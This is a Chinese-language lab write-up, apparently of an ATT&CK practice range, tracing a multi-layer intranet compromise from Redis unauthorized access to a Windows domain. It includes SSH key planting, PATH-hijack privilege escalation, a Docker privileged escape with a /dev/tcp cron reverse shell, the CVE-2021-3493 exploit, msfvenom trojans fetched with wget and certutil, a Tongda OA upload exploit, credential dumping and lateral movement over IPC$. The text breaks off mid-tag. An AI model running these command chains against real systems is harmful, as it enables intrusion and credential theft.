title=\"Redis未授权\"></a>Redis未授权</h2><p>先上两篇文章</p>\n<p><a href=\"https://www.freebuf.com/articles/web/249238.html\">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a><br><a href=\"https://cloud.tencent.com/developer/article/1853008\">Redis 常见漏洞利用方法总结 - 云+社区 - 腾讯云 (tencent.com)</a></p>\n<p>还有一个 <code>6379端口</code> 没有测试，要充分发挥所收集到的信息加以利用</p>\n<p>Redis：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//53c749913e7d453f815b44d716644883.png\"><br>先安装个客户端</p>\n<blockquote>\n<p>#安装<br>wget <a href=\"http://download.redis.io/redis-stable.tar.gz\">http://download.redis.io/redis-stable.tar.gz</a><br>tar xvzf redis-stable.tar.gz<br>cd redis-stable<br>make<br>sudo cp src/redis-cli /usr/local/bin/</p>\n</blockquote>\n<p>先尝试连接redis：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d51692c57b2748a89fb4e606eaf3c527.png\"><br>连接成功，尝试写ssh 公钥</p>\n<blockquote>\n<p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过<code>修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys</code>，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d9a083f45d1a4bc09126541858e71fa7.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//581cb4f18e1c41cabaf63126b0b4ceeb.png\"><br>接着将公钥导入key.txt文件（前后用\\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa  &#x2F;&#x2F;主机生成公钥</span><br><span class=\"line\"></span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; cys.txt  &#x2F;&#x2F;将公钥导入cys.txt文件,避免数据混合用 &#39;\\n&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">cat cys.txt | redis-cli -h 192.168.42.30 -p 6379 -x set cys   &#x2F;&#x2F;把cys.txt文件内容写入目标主机的redis缓冲中,key为cys</span><br><span class=\"line\">&#x2F;&#x2F; -x 代表从标准输入读取数据作为该命令的最后一个参数</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c183371ac85c4ad184cd4df45e591748.png\"><br>然后，使用攻击机连接目标机器Redis，<code>设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys</code>，并将数据保存在目标服务器硬盘上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir &#x2F;root&#x2F;.ssh      # 设置redis的备份路径为&#x2F;root&#x2F;.ssh&#x2F;</span><br><span class=\"line\">config set dbfilename authorized_keys     # 设置保存文件名authorized_keys</span><br><span class=\"line\">save        # 将数据保存在目标服务器硬盘上</span><br><span class=\"line\">ssh 192.168.213.188    #连接</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//707e71b107d54c01b85279d11ca9e418.png\"><br>攻击机ssh直接连接：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7f735e32a3db4317a973c88c0654a17a.png\"></p>\n<p>先看一手IP信息发现两个网段</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d946a70ebdf64a7d99f56cc9fce62faf.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//00bf65081ce34de6b22cf9198a56596e.png\"><br>发现nginx服务：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c70a5ff7bd7a48d4a8e875531be06a3c.png\"><br>看一下配置文件：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fdf80c4557c4a5f8eb0f044d3f01222.png\"><br>81端口是反代另一个网段的机器的8000端口，结合webshell的docker环境，所以说，web1反代了web2的docker，那么接下来就是利用docker逃逸来控制第二台机器</p>\n<h2 id=\"反弹dockershell\"><a href=\"#反弹dockershell\" class=\"headerlink\" title=\"反弹dockershell\"></a>反弹dockershell</h2><blockquote>\n<p>按说，第二层网络是nat，应该是能访问到kali的，所以这里我能反弹dockers的shell，但是这个师傅说docker不出网，可能是前面的网络配置不同吧</p>\n</blockquote>\n<p>后来想了一下，真实环境中，web2应该处于内网中，肯定不能访问kali，所以将docker的shell反弹到web1上，将web1作为跳板机</p>\n<p>反弹shell的方式也有很多了，bash一句话，msf，python起一个httpserver等</p>\n<p>bash一句话：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cfb2fab357bf41c9a432400a5b2c7ade.png\"></p>\n<h2 id=\"docker提权–环境变量提权\"><a href=\"#docker提权–环境变量提权\" class=\"headerlink\" title=\"docker提权–环境变量提权\"></a>docker提权–环境变量提权</h2><p>现在的docker权限是一个www-data，先将权限提升一下</p>\n<p>能想到的是内核提权，但是这里学习到了一个新的方法，环境变量提权</p>\n<p><a href=\"https://www.freebuf.com/articles/system/173903.html\">在Linux中使用环境变量进行提权</a></p>\n<p>这里就必须了解一下 <code>$PATH是个什么</code>：</p>\n<blockquote>\n<p>PATH变量就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索PATH变量变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以运行。PATH的值是一系列目录，<code>echo $PATH</code> 可以显示环境变量</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1cfe46c1d624451da701158de08f3803.png\"><br>那么第一步就是先寻找带有SUID的文件,<a href=\"http://c.biancheng.net/view/868.html\">Linux SetUID（SUID）文件特殊权限用法详解</a></p>\n<blockquote>\n<p>简单来说，对于一个可执行文件，当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\"></span><br><span class=\"line\">-perm -u&#x3D;s : 所有者权限有s权限的目录或文件</span><br><span class=\"line\">-type f  : 文件类型是一般文件</span><br><span class=\"line\">2&gt;&#x2F;dev&#x2F;null : 标准输出错误输入到空(就是错误不显示)</span><br></pre></td></tr></table></figure>\n\n<p>发现一个shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//078afd3ceba74f1baeea796defa7566a.png\"></p>\n<p>看一下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//28ba729bfaab4989a43472b17cc12b74.png\"></p>\n<p><code>运行ps命令，但是没有使用绝对路径</code></p>\n<p>那么我们尝试更改 <code>$PATH</code> 来执行我们的恶意程序，从而获得目标主机的高权限shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd &#x2F;tmp</span><br><span class=\"line\">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class=\"line\">chmod 777 ps</span><br><span class=\"line\">echo $PATH </span><br><span class=\"line\">export PATH&#x3D;&#x2F;tmp:$PATH # 将&#x2F;tmp添加到环境变量中，并且先加载执行&#x2F;tmp里的程序</span><br><span class=\"line\">cd &#x2F;home&#x2F;jobs</span><br><span class=\"line\">.&#x2F;shell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1a98a01b8d47490bba6d728b92e5fec1.png\"></p>\n<p><code>个人理解</code>：当运行./shell 时，执行系统命令 ps 这个命令本应该在/usr/bin下执行，但是我们添加了一个<code>同名ps且可执行</code>，并且在 $PATH 中 /tmp 处于最开头，所以 <code>先执行了/tmp下的恶意ps</code>，而且因为./shell的<code>s权限</code>，所以在执行恶意 ps 时会以 root 身份执行</p>\n<p>将docker的root权限一句话反弹到web1，www-data的shell可以扔掉了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//db03344db2ab447a8d120ff234c699e0.png\"></p>\n<h2 id=\"docker逃逸\"><a href=\"#docker逃逸\" class=\"headerlink\" title=\"docker逃逸\"></a>docker逃逸</h2><p>毕竟是一个docker环境，肯定要进行逃逸</p>\n<p>那么基本就三种逃逸方式了：</p>\n<blockquote>\n<p>一、由内核漏洞引起 ——Dirty COW(CVE-2016-5195)<br>二、由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271<br>三、由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</p>\n</blockquote>\n<p>这里利用特权模式进行逃逸</p>\n<p>原理</p>\n<blockquote>\n<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fdisk -l   &#x2F;&#x2F;查看磁盘文件</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9da33fe626304021a88df527d876a98c.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir &#x2F;cyshack   &#x2F;&#x2F;创建 cyshack文件夹</span><br><span class=\"line\">mount &#x2F;dev&#x2F;sda1 &#x2F;cyshack   &#x2F;&#x2F;将设备挂载到新目录下</span><br><span class=\"line\">ls &#x2F;cyshack  &#x2F;&#x2F;查看是否挂载成功</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c2ac3ee03bab4880bfb5839f357852a2.png\"><br>挂载成功，写入计划任务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.52.10&#x2F;7002 0&gt;&amp;1&#39; &gt;&gt; &#x2F;cyshack&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure>\n<p>但是没有响应</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//de878490496c4eb796b61308cc7ec838.png\"><br>再次尝试写ssh密钥，发现/cyshack/root下没有.ssh目录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//8fd3d153c2144cbc9ffd21d1df575126.png\"><br>再看一下/cyshack/home/ubuntu\\</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ed4c058436664b95b67985d3b55d44a5.png\"><br>那么就往这里写ssh秘钥，这里还是要在web1上进行写ssh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -f cyshack</span><br><span class=\"line\">chmod 600 cyshack</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2b24a9b37581446d90bccf570c3a3169.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp -avx &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </span><br><span class=\"line\">&#x2F;&#x2F; -avx 将权限也一起复制</span><br><span class=\"line\"></span><br><span class=\"line\">echo &gt; authorized_keys  &#x2F;&#x2F;将内容清空</span><br><span class=\"line\"></span><br><span class=\"line\">echo &#39;生成的.pub内容&#39; &gt; authorized_keys  &#x2F;&#x2F;将ssh秘钥写入</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4d416464c2b043a89fe10e1bdd984af4.png\"><br>用web1尝试ssh连接 web2：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -i cyshack ubuntu@192.168.52.20</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//644d08c2a340453cafe922512d54a65d.png\"><br>获取到了web2的ubuntu用户的shell</p>\n<p>又发现一个93网段</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d8f86df95c2348abb10233890c29522a.png\"></p>\n<h1 id=\"CVE-2021-3493\"><a href=\"#CVE-2021-3493\" class=\"headerlink\" title=\"CVE-2021-3493\"></a>CVE-2021-3493</h1><p>影响版本：</p>\n<blockquote>\n<p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>\n</blockquote>\n<p>将web2的ubuntu进行提权</p>\n<p>exp：<a href=\"https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c\">CVE-2021-3493/exploit.c at main · briskets</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim exploit.c #将下载的exploit.c的内容粘贴到该文件中</span><br><span class=\"line\">gcc exploit.c -o exploit #编译</span><br><span class=\"line\">chmod +x exploit</span><br><span class=\"line\">.&#x2F;exploit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fb61764762c64ddbab71ab0878bc7686.png\"></p>\n<h1 id=\"上线MSF\"><a href=\"#上线MSF\" class=\"headerlink\" title=\"上线MSF\"></a>上线MSF</h1><p>将这两台root机器上线到msf</p>\n<p>Web1：</p>\n<p>可以msfvenom生成，web1再执行wget并运行，来反弹shell</p>\n<p>这里直接运用 <code>web_delivery</code> 进行上线，记得切换<code>payload</code> 和 <code>target</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//82bc99be64074c389d8ad89c5840e9b8.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1d07be6335f848b7a948bc183d4f3c1b.png\"><br>下一步就是添加路由上线web2，msf更新后，添加路由更方便了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7ae47f7ea9494f50858d4053fe86705d.png\"></p>\n<p>生成木马，这里运用 <code>bind_tcp</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;8003 -f elf &gt;shell2.elf</span><br></pre></td></tr></table></figure>\n<p>这里怎么让这个木马传到web2呢？因为它不出网，所以web1利用 <code>python起一个httpserver</code> 然后web2利用wget这个木马</p>\n<p>上传木马到web1</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">upload .&#x2F;shell.elf &#x2F;tmp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d6bc3360d674df88aacb8a792b7210d.png\"></p>\n<p>web1起一个服务：注意路径，要起到木马的目录下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m http.server</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//60a72cecad1a4d649c5b31d2f67d27c8.png\"><br>web2进行下载：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;192.168.52.10:8000&#x2F;shell.elf</span><br><span class=\"line\">chmod +x shell.elf</span><br><span class=\"line\">.&#x2F;shell.elf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1b49ba7a8e9740b8971cb0ad4d4f3f71.png\"><br>运行上线</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7e836052337d412a859e3863fca8a3cf.png\"><br>至此有两个机器的shell</p>\n<h1 id=\"二层网络渗透\"><a href=\"#二层网络渗透\" class=\"headerlink\" title=\"二层网络渗透\"></a>二层网络渗透</h1><p>添加路由，添加代理(socks_proxy模块记得开启)</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>内网扫描，先扫52网段，有个问题是，pc1开启防火墙，msf 和 nmap都试了几个都没能扫出来，怎么破？</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//239ff8697d3f41ac9bc5e6fc4e61d045.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d56f010a795d4a8683c7696002dafd2b.png\"><br>最后 <code>netbios</code> 破了，但是只扫出来一次，os为windows</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d176266efa75473a966f4826fbea7a08.png\"><br>Nmap扫一下pc1，没扫出来，哎，先手动关了防火墙，进行下面的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -Pn -sT -sV -F  192.168.52.30</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cf98e4a1835f41a0ab3c5f2df20c7386.png\"><br>发现8080有一个 http 服务</p>\n<p>再扫一下版本信息，win7 还存在域环境</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2750c4ec2f724cdeb24ec6503cdfd6bd.png\"><br>既然是win7，ms17_010</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ea822a525dc147438753a1f2653ee50b.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//083e4e10ccde4dcb9c560f210f4dfb86.png\"><br>失败了</p>\n<h2 id=\"添加代理-访问-http-服务\"><a href=\"#添加代理-访问-http-服务\" class=\"headerlink\" title=\"添加代理 访问 http 服务\"></a>添加代理 访问 http 服务</h2><p>看看http服务吧，浏览器先添加代理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//793acbb4dd84467d98afa369909944e8.png\" alt=\"在这里插入图片描述\"><br>或者proxy代理工具，根据情况自动调整</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//328ef4bf59ac4f649004955c1fd88330.png\"><br>访问：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c22bc9e15e411a9374d6ca00368474.png\"><br>信息收集：/inc/expired.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9392aab0eb624a3b823336b4ff1cbed9.png\"></p>\n<h2 id=\"漏洞利用-1\"><a href=\"#漏洞利用-1\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p><a href=\"https://zhuanlan.zhihu.com/p/334640244\">通达OA前台任意文件上传漏洞+文件包含漏洞导致getshell - 知乎 (zhihu.com)</a></p>\n<p>Burpsuite设置socks代理，不知道为什么socks4不能用：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f0d6c518255c45f5a735d7c9efcacfc2.png\"></p>\n<p>上传：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e012d20b58114b04aa3bf5366a7d38fa.png\"></p>\n<p>post:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.52.30:8080&#x2F;&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br><span class=\"line\"></span><br><span class=\"line\">json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2108&#x2F;1888762391.jpg&quot;&#125;&amp;cmd&#x3D;net user</span><br></pre></td></tr></table></figure>\n<h2 id=\"上线msf\"><a href=\"#上线msf\" class=\"headerlink\" title=\"上线msf\"></a>上线msf</h2><p>Msf利用web_delivery</p>\n<p>生成powershell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d749b30b2b944fea074420f630ccd2f.png\" alt=\"在这里插入图片描述\"></p>\n<p>这里没有上线成功</p>\n<p>想着让win7主动下载木马</p>\n<p>这里我偷个懒直接攻击机起一个服务，在真实渗透环境中，应该上传到跳板机上</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f482bb44341a414ea24a0e65607a40e4.png\"></p>\n<p>让win7主动下载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.42.224&#x2F;shell3.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dd986b533f41492b95f58002ee730b8b.png\"><br>开启监听：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a192967f4cb844c38d30efdfc0ba09e0.png\"><br>没反应，传一个 bind_tcp的马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc8069b746e042be99dd8051c96dd146.png\"><br>监听换个payload，再次执行上面</p>\n<p>上线成功：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9dd2a2c725b944f399071251d0b1c713.png\"></p>\n<h1 id=\"三层网络信息收集\"><a href=\"#三层网络信息收集\" class=\"headerlink\" title=\"三层网络信息收集\"></a>三层网络信息收集</h1><h2 id=\"降权\"><a href=\"#降权\" class=\"headerlink\" title=\"降权\"></a>降权</h2><p>先看一下权限</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b56f595b3d0843c4bb63d76f8e8d27d4.png\"><br>System权限，为了方便信息收集，将当前权限降为普通域用户，因为不是域用户没有权限执行域命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">getuid &#x2F;&#x2F;查看当前token</span><br><span class=\"line\">use incognito &#x2F;&#x2F;加载incognito</span><br><span class=\"line\">list_tokens -u &#x2F;&#x2F;列出accesstoken</span><br><span class=\"line\">impersonate_token &quot;DEMO\\douser&quot;  &#x2F;&#x2F;模拟&quot;DEMO\\douser”用户</span><br><span class=\"line\">rev2self  &#x2F;&#x2F;返回之前的accesstoken权限</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//04f48daef0414c1ba373b9c1ac2b9286.png\"><br>降权成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b7fd5c8867d447baa2f26f09c1ddcef4.png\"><br>进入shell失败，那么 <code>进程迁移到域用户</code>，这里迁移了好几个都是system权限，还得多学习这方面</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//026e2ebdeb0f470993bfe597570d84fc.png\"></p>\n<h2 id=\"域信息收集\"><a href=\"#域信息收集\" class=\"headerlink\" title=\"域信息收集\"></a>域信息收集</h2><p>利用域用户进行信息收集</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5e0f994fd9334d6aa9520fef3e9deeaa.png\"><br>域用户</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc5fb2abf6af4f00916453387f74d3bf.png\"><br>域内机器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e77e5652e9b744f18af11ec5ea0f86e7.png\"><br>域内其他主机名：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//bc3ae6daecb44b3b82f6695cb0d94be3.png\"><br>域控列表</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dc11dcb9bf074a748f8d75f5a4cb74d9.png\"><br>域控ip</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//456757690554447086f35d1d68ffdccc.png\"><br>域管</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fe47b85a98244938ffb2118a26672be.png\"><br>整理：当前PC1(192.168.93.20)存在域环境，域控DC(192.168.93.30)和PC2(192.168.93.40)  域管账户为administrator</p>\n<h2 id=\"抓取密码\"><a href=\"#抓取密码\" class=\"headerlink\" title=\"抓取密码\"></a>抓取密码</h2><p>因为抓密码要system权限，所以我们再打一个system权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//6da88b4814044d39b8f8048caea0cae9.png\"><br>抓取到密码：</p>\n<blockquote>\n<p>bunny:Bunny2021<br>administrator:Whoami2021</p>\n</blockquote>\n<p>开启3389</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5fc0111ed76f4b86927207d8b9266570.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u bunny -p &quot;Bunny2021&quot; 192.168.52.30</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9d82071875e9491a891573cbdea27aae.png\"><br>失败</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0a63b81c38e94316ba87add67ad126aa.png\"></p>\n<h1 id=\"三层网络渗透\"><a href=\"#三层网络渗透\" class=\"headerlink\" title=\"三层网络渗透\"></a>三层网络渗透</h1><p>接下来就是王第三层网络进行渗透</p>\n<p>添加路由</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2ada0f0b4d604f279ecacea0d1490916.png\"><br>探测windows版本：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//42fc36db087548d3b2b90920cd5dbe9d.png\"></p>\n<p>Ms17-010</p>\n<p>先打win7(PC2)失败</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e9fc04d47e5b48cbab8aad3f04330061.png\"></p>\n<p>我看师傅们都是利用17_010来上线的，打的时候经常断掉，因为抓取过域管密码，所以尝试 <code>ipc</code></p>\n<h2 id=\"IPC\"><a href=\"#IPC\" class=\"headerlink\" title=\"$IPC\"></a>$IPC</h2><p>建立ipc连接</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4dfe2f47d95d4bbfa759dca4906fed1f.png\"><br>生成木马：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d0710ced3002422888bef520910d9f3e.png\"><br>上传到PC1    </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//83767830d60e47a697f16aea593f6e95.png\"><br>共享到PC2</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//48124d1729b54dbf966914ab0415a6a1.png\"><br>计划任务开启：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">at \\\\192.168.93.40 16:45 c:\\houmen.exe</span><br></pre></td></tr></table></figure>\n\n<p><img 